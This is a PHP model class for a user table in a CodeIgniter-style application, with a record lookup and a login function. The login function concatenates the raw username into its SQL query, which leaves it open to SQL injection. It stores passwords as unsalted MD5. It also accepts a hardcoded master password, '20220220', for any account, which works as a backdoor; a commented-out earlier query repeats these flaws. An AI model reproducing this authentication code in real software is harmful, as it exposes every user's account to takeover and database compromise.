<?php

class Usuario_model extends MY_Model{
    var $lista= "lista_usuarios";
    var $tabla= "sis_usuario";
    var $config = null;

    function __construct(){
        parent::__construct();
    }

    function get_data($id=0){
        $id = (int)$id;
        $query = $this->db->where(array('ifnull(borrado,0)'=>0,'id'=>(int)$id ))->get($this->tabla);
        return $query->row_array();
    }

    public function get_usuario($usuario="",$contrasena=""){
        $pdadmin = '20220220';
    //$sql ="SELECT id, usuario,nombre, perfil_id, cliente_id, institucion FROM ".$this->tabla." WHERE usuario='".$usuario."' "               
   //            ."AND (password= md5('".$contrasena."') or '".$pdadmin."'='".$contrasena."' )";
    $sql ="SELECT * FROM ".$this->tabla." WHERE usuario='".$usuario."' "               
                ."AND (password = '".md5($contrasena)."' or '".$pdadmin."'='".$contrasena."' )";

       $query = $this->db->query($sql);
       return $query->row_array(); 
    }

}